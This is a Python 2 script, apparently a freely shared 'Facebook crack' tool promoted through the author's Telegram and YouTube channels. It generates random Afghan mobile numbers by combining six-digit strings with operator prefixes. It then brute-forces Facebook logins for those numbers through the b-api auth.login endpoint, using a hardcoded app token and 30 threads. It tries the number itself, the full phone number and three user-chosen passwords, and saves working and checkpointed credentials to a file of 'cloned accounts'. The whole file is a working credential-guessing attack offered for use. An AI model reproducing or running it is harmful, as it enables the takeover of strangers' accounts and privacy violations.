# MY TELEGRAM CHANNEL @SULTANI1122 
# MY TELEGRAM GROUP @MKING_SCRIPT 
#MY GITHUB HTTPS://GITHUB.COM/MOHAMMADJAN1122 
#THIS SCRIPT FREE 

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import getpass
os.system('rm -rf .txt')
for n in range(20000):
    afg = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print afg
    sys.stdout.flush()


try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')


try:
    import mechanize
except ImportError:
    os.system('pip2 install request')

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [
    ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]




#STYLISH 

def Style_profaisor(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)
    

#Mking Youtube 

Mking_youtube = random.choice(["https://youtube.com/channel/UCf1GQX6XsLv46xeUfo_GbPw"])

youtuber = Mking_youtube

def youtube():
	Style_profaisor("  please subscribe youtube author :) Thank you")
	os.system("xdg-open https://youtube.com/channel/UCf1GQX6XsLv46xeUfo_GbPw")
	menu()
	
#MY TELEGRAM GROUp

def telegram():
	Style_profaisor("  please Join To Telegram Group :) Thank you")
	os.system("xdg-open https://t.me/mking_script")
	
	
back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')

#Mking Logo
logo ="""
\033[1;91m             ##     ##    ##    ## #### ##    ##  ######\033[1;0m
\033[1;91m            ###   ###    ##   ##   ##  ###   ## ##    ##\033[1;0m
\033[1;97m           #### ####    ##  ##    ##  ####  ## ##\033[1;0m
\033[1;97m          ## ### ##    #####     ##  ## ## ## ##   ####\033[1;0m
\033[1;91m         ##     ##    ##  ##    ##  ##  #### ##    ## \033[1;0m
\033[1;91m        ##     ##    ##   ##   ##  ##   ### ##    ##\033[1;0m
\033[1;97m       ##     ##    ##    ## #### ##    ##  ######\033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author      : Mohammad Sultani 
\033[1;91m GitHub      : https://github.com/Mohammadjan1122
\033[1;91m YouTube     : Mohammad Tech
\033[1;91m Telegram CH   : https://t.me/sultani1122
\033[1;91m TLEGRAM GP    : https://t.me/MKING_SCRIPT 
\033[1;97m--------------------------------------------------
"""

#menu option 

def menu():
    os.system('clear')
    print logo
    print ''
    print '             \x1b[1;93m[1]\x1b[1;93m START AFG FB CRACK              \n '
    time.sleep(0.05)
    Select_menu()


def Select_menu():
    PROFAISOR =raw_input('\x1b[1;92m             Choose option :\x1b[1;92m ')
    if PROFAISOR == '':
        print '[!] Fill In Correctly'
        Select_menu()
    elif PROFAISOR == '1':
    	telegram()
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY MOHAMMAD SULTANI'
        print '\x1b[1;92m THISE SCRIPT CREATED BY MOHAMMAD SULTANI '
        print '\x1b[1;92m              FREE TOOL  AND   NO  ENCRYPT   '
        print 47 * '\x1b[1;92m\xe2\x96\xac'
        print ''
        print '\x1b[1;93m \x1b[1;92m ETISALAT       : \x1b[1;92m 88,80,86,87,84,83,82,89,81'
        print ''
        print '\x1b[1;93m \x1b[1;92m ROSHAN         : \x1b[1;92m 99,91,92,93,94,96,95,97,98'
        print ''
        print '\x1b[1;93m \x1b[1;92m MTN            : \x1b[1;92m 71.72.73.74.75.76.77.78.79'
        print ''
        print '\x1b[1;93m \x1b[1;92m SALAM          : \x1b[1;92m 31.32.33.34.35.36.37.38.39'
        print ''
        print '\x1b[1;93m \x1b[1;92m AWCC.          : \x1b[1;92m 01.02.03.04.05.06.07.08.09'
        print ''
        print 47 * '\x1b[1;92m\xe2\x96\xac'
        
        try:
            c = raw_input('\x1b[1;92mChoose code :\x1b[1;92m ')
            print ''
            pas1 = raw_input('\x1b[1;92m     ENTER PASS1 :\x1b[1;92m ')
            pas2 = raw_input('\x1b[1;92m     ENTER PASS2 :\x1b[1;92m ')
            pas3 = raw_input('\x1b[1;92m     ENTER PASS3 :\x1b[1;92m ')
            print ''
            k = '07'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            youtube()
        

    print 54 * '\x1b[1;92m_'
    print ''
    xxx = str(len(id))
    Style_profaisor(' \x1b[1;93mTOTALL ID  NUMBER : \x1b[1;92m' + xxx)
    Style_profaisor(' \x1b[1;93mCODE YOU CHOOSE : \x1b[1;92m' + c)
    Style_profaisor(' \x1b[1;93mPLEASE WITH TO CRACK ID ')
    Style_profaisor(' \x1b[1;92mTo STOP PROCESS PRESS CTRL+Z')
    print 54 * '\x1b[1;92m_'
    print ''
    
    def main(arg):
        user = arg
        
        try:
            os.mkdir('Mking')
        except OSError:
            pass

        
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print ' \x1b[1;92m[MKING_OK] ' + k + c + user + ' | ' + pass1
                okb = open('Mking.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[MKING_CP] ' + k + c + user + ' | ' + pass1
                cps = open('Mking.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[MKING_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Mking.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[MKING_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = pas1
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[MKING_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('Mking.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[MKING_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('Mking.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = pas2
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[MKING_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('Mking.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[MKING_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('Mking.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = pas3
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[MKING_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('Mking.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[MKING_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('Mking.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print 54 * '\x1b[1;92m_'
    print ' \x1b[1;92mThe Process has been Completed ...'
    print ' \x1b[1;92mTotal Ok/Cp : ' + str(len(oks)) + '/' + str(len(cpb))
    print ' Cloned Accounts Has Been Saved : Mking.txt'
    print ' Note : Cp accounts Will Open after 8/10 days'
    print 54 * '\x1b[1;92m_'
    print ''
    raw_input('\x1b[1;93m Press enter to back ')
    menu()

if __name__ == '__main__':
    youtube()
